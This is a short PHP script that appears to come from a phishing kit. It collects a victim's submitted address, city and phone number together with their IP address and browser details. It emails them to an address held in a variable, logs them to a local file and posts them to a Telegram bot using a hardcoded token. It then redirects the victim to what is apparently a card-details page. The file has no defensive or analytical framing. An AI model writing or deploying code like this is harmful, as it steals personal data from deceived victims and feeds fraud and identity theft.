<?php
// include_once 'functions.php';
    
    $IP = getenv("REMOTE_ADDR");
    $message .= "-------[OMAN ]-------\n";

  
    $message .= "Address : ".$_POST['Address']."\n";
    $message .= "City : ".$_POST['City']."\n";
    $message .= "Phone : ".$_POST['Phone']."\n";
   
    $message .= "-------------- IP Infos ------------\n";
    $message .= "https://geoiptool.com/en/?ip=$IP\n";
    $message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
  
    $subject = "sa Post [ " . $IP . " ] ";
    $email = "".$EX445093_REMOT."";
    mail($email,$subject,$message);
    $text = fopen('./bando.txt', 'a');
    fwrite($text, $message);
    
    $token = "6136023488:AAGqHCMt4XHqqZR5ioV8qSOp4vNLDlrX2Jo";
    $data = [
        'text' => $message,
        'chat_id' => '5306332959'
    ];
    
    file_get_contents("https://api.telegram.org/bot6136023488:AAGqHCMt4XHqqZR5ioV8qSOp4vNLDlrX2Jo/sendMessage?" . http_build_query($data) );
    
    // Attendre 19 secondes
    // sleep(19);
    
    header("location: ../divs/card.html");
   
?>
